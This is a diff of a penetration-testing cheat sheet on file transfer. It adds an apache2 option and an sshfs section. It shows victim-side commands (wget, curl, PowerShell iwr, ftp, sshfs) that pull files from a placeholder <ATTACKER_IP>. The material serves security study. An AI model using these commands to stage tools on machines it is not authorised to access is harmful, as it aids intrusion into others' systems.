@@ -5,20 +5,21 @@ _Best for: Quick transfers, one-time use._
 
 ### Attacker (Sender)
 
-Bash
-
 ```
 # Python 3
 python3 -m http.server 80
 
 # Or using PHP
 php -S 0.0.0.0:80
+
+# or using apache2
+sudo systemctl satrt apache2
 ```
 
 ### Victim (Receiver)
 
 ```
-Linux `wget http://<ATTACKER_IP>/filename  
+Linux wget http://<ATTACKER_IP>/filename  
 curl -O http://<ATTACKER_IP>/filename
     
 Windows (PowerShell) iwr -uri http://<ATTACKER_IP>/filename -OutFile filename
@@ -93,7 +94,6 @@ _Best for: Large files or legacy systems._
 
 _Setup an FTP server using python or pure-ftpd._
 
-Bash
 
 ```
 # Simple Python FTP server
@@ -107,3 +107,36 @@ Linux ftp <ATTACKER_IP> -> get filename
     
 Windows ftp <ATTACKER_IP> ->  get filename
 ```
+
+
+## 6.SSH Filesystem (`sshfs`)
+
+Best for: Editing remote files directly from your local machine .
+
+### Attacker (Source):
+
+- _Make sure SSH server is running (`sudo systemctl start ssh`)._
+
+### Victim (Receiver):
+
+#### i. Create a local mount point
+```
+mkdir ~/remote_files
+```
+
+#### ii. Mount the remote directory
+```
+sshfs username@<ATTACKER_IP>:/path/to/remote/folder ~/remote_files
+```
+
+#### iii. Use it like a local folder
+```
+cd ~/remote_files
+```
+
+#### iv. Unmount when finished
+```
+fusermount -u ~/remote_files
+```
+
+---
